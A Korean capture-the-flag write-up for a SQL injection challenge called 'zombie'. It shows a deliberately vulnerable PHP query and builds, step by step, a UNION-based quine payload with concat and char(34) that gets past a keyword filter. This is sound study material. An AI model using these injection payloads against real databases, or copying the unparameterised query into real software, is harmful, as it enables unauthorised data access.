# zombie

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect("zombie");
  if(preg_match('/rollup|join|ace|@/i', $_GET['pw'])) exit("No Hack ~_~");
  $query = "select pw from prob_zombie where pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['pw']) echo "<h2>Pw : {$result[pw]}</h2>";
  if(($result['pw']) && ($result['pw'] === $_GET['pw'])) solve("zombie");
  highlight_file(__FILE__);
?>
```

## 2. Condition
- `rollup join ace @`등을 필터링 하고있다.   
&rarr; ace는 replace 함수를 필터링하기 위함인것 같다.   
- GET 파라미터 pw와 sql 쿼리 실행 결과의 pw가 동일하다면, 문제가 해결된다.   


## 3. Solution   

이전 문제 <a href="./../ouroboros/ouroboros.md">ouroboros</a>와 같은 quine 문제이다.   
다른 점이라면 `replace`함수를 더이상 쓸 수 없다는 점이다.    



대안으로 `concat`함수와 서브쿼리 그리고 alias가 있다.   

```sql
' union select a from (select 'hihi' as a)as a%23
```
위 쿼리의 결과로 hihi가 출력되는 것을 볼 수 있다.   





이제, concat함수를 이용하면 메인코드 부분과 서브쿼리 부분을 모두 출력할 수 있다.   
```sql
' union select concat(a,a) from (select "' union select conct(a,a) from (select " as a)as a%23
```
결과는 다음과 같다.   
```sql
Pw : ' union select conct(a,a) from (select ' union select conct(a,a) from (select
```   





마지막으로 두 가지 문제가 있다.    

1. double qoutes 출력에 관한 문제
>    concat 함수 안에 `char(34)`을 넣어줌으로써 해결할 수 있다.   
```sql
' union select concat(a,char(34),a,char(34)) from (select "' union select conct(a,char(34),a,char(34)) from (select " as a)as a%23
```
>    결과는 다음과 같다.   
```sql
Pw : ' union select conct(a,char(34),a,char(34)) from (select "' union select conct(a,char(34),a,char(34)) from (select "
```




2. 입력한 값의 마지막 부분, ` as a)as a%23`에 관한 문제
> 간단하게 concat 함수 안에 추가해 주면 된다.    
```sql
' union select concat(a,char(34),a,char(34),' as a)as a%23') from (select "' union select concat(a,char(34),a,char(34),' as a)as a%23') from (select " as a)as a%23
```   
>    결과는 다음과 같으며, 문제가 해결되었다.   
```sql
Pw : ' union select concat(a,char(34),a,char(34),' as a)as a#') from (select "' union select concat(a,char(34),a,char(34),' as a)as a#') from (select " as a)as a#
ZOMBIE Clear!
```